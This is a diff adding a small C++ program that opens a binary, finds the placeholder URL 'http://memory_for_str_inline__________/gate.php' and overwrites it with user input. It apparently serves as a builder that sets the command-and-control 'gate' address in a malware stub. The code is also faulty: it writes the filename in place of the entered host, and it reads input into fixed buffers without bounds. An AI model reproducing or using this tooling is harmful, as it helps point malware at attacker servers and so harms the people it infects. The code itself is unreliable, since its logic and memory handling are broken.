@@ -1,0 +1,50 @@
+#include <algorithm>
+#include <fstream>
+#include <iterator>
+#include <string>
+#include <vector>
+#include <iostream>
+
+template <typename It>
+void replace(const std::string &filename, It source_dest_begin, It source_dest_end,
+It to_begin, It to_end) {
+using value_type = typename std::iterator_traits<It>::value_type;
+if (std::distance(source_dest_begin, source_dest_end) < std::distance(to_begin, to_end)) {
+ return;
+}
+std::vector<value_type> data;
+{
+ std::ifstream in{ filename, std::ios::binary };
+ std::copy(std::istreambuf_iterator<value_type>{in},
+ 	std::istreambuf_iterator<value_type>{}, std::back_inserter(data));
+}
+auto start =
+ std::search(std::begin(data), std::end(data), source_dest_begin, source_dest_end);
+auto end = start;
+std::advance(end, std::distance(source_dest_begin, source_dest_end));
+if (start == std::end(data)) {
+ return;
+}
+start = std::copy(to_begin, to_end, start);
+std::fill(start, end, 0);
+{
+ std::ofstream out{ filename, std::ios::binary };
+ std::copy(std::begin(data), std::end(data),
+ 	std::ostreambuf_iterator<value_type>{out});
+}
+}
+int main()
+{
+char filename[30];
+char addr[40];
+printf("path to file:\n");
+std::cin >> filename;
+printf("host:\n");
+std::cin >> addr;
+std::string source_dest{ "http://memory_for_str_inline__________/gate.php" };
+std::string to{ filename };
+replace(filename, source_dest.begin(), source_dest.end(), to.begin(), to.end());
+printf("pathing");
+return 0;
+}
+
